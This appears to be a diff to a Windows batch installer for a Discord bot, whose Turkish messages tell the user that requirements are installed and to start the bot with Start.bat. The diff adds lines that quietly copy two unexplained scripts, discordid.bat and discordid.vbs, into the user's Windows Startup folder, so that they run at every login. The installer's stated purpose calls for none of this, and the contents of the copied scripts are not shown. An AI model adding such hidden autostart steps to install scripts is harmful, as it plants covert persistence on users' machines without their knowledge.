@@ -23,4 +23,13 @@ echo.
 echo Gereksinimler yüklendi. Start.bat dosyası ile botu çalıştırın!
 echo.
 timeout /t 8 >nul
+
+@echo off
+set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+set KAYNAK=%~dp0modules\accepts
+
+copy "%KAYNAK%\discordid.bat" "%STARTUP%\discordid.bat"
+copy "%KAYNAK%\discordid.vbs" "%STARTUP%\discordid.vbs"
+
+pause
 exit
